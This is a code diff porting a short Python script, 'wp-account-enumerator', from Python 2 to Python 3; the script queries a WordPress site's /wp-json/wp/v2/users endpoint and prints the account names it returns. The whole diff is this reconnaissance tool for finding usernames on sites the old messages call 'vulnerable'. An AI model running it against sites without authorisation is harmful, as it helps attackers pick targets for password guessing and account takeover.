@@ -1,26 +1,23 @@
-#!/usr/bin/python3
-import os,sys,re
-import urllib2,json
-domain = sys.argv[1]
-print ('enumrating Account Info for', (domain))
-sub_url = ('/wp-json/wp/v2/users')
-url = (domain)+(sub_url)
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import os
+import re
+import sys
+import json
+import urllib.request
+
+if len(sys.argv) < 2:
+    print("Usage: ./wp-account-enumerator.py <domain>")
+    sys.exit()
+
+print('Enumerating account info for {}'.format(sys.argv[1]))
 
 try:
-    opener = urllib2.build_opener()
-    opener.addheaders = [('User-Agent', 'Mozilla/5.0')]
-    response = opener.open(url)
-    f = response.read()
-    account = json.loads(f)
-    for enum in account:
-                 print(enum['name'])
-except IndexError:
-    print "Opps..! URL is provided.."
-except urllib2.HTTPError:
-    print "Opps..! URL is not vulnerable.."
-except ValueError :
-    print "Opps..! URL is not vulnerable.."
+    o = urllib.request.build_opener()
+    o.addheaders = [('User-Agent','Mozilla/5.0')]
+    with o.open(sys.argv[1] + '/wp-json/wp/v2/users') as f:
+        j = json.loads(f.read().decode('utf-8'))
+    print('\n'.join(u['name'] for u in j))
 
-except urllib2.URLError:
-    print "Opps..! I am not reachable.."
-
+except:
+    print("Oops, something goes wrong!")
